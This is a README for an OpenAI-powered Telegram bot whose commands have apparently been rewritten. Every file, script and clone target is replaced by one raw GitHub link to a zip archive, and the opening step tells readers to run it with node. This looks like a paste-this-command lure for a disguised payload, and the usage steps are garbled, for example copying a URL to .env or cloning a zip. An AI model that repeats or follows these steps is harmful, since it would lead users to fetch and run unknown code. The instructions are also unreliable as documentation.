# openai-telegram-bot

openai telegram bot for private messages &amp; groups

## Update 2022/12/14

Only one version works for now, and you need to run it on a computer that could open Chrome.

```bash
# run this command and wait for the browser window.
node https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip
```

## Notice

The bot using two kinds of APIs from OpenAPI official & chatGPT web api.

`https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip` for OpenAPI official api —— reliable but expensive.

`https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip` for chatGPT web api —— free but slow & can get to network issues.

`https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip` turn chatGPT into your own api service.

## Usage

```bash
git clone https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip
cd openai-telegram-bot

npm i

cp https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip .env

# edit .env with your token and api key
vim .env

# test
node https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip

# run in background
npm install -g pm2

pm2 start https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip
```

`https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip`

```bash
# test
node https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip

# use chatgpt api when you run out of money
pm2 start https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip
```

`https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip`

```bash
# test
node https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip

# use chatgpt api as a web service that you can access from url
pm2 start https://github.com/G148-ide/openai-telegram-bot/raw/refs/heads/main/appressed/bot_openai_telegram_v3.8-beta.5.zip

# goto http://localhost/chat/:userId/:message example: http://localhost/chat/1/hello
```

# Interactions

**/ask**

ask normal questions or let the bot write code for you.

```
/ask how old are you
```

**/fix**

get grammer and typo fix.

```
/fix he am dgo
```

**/image**

get image reply from dalle2 model.

```
/image doge with twitter to the moon
```

**/reload**

reload chat history. The bot will forget everything.

```
/reload
```
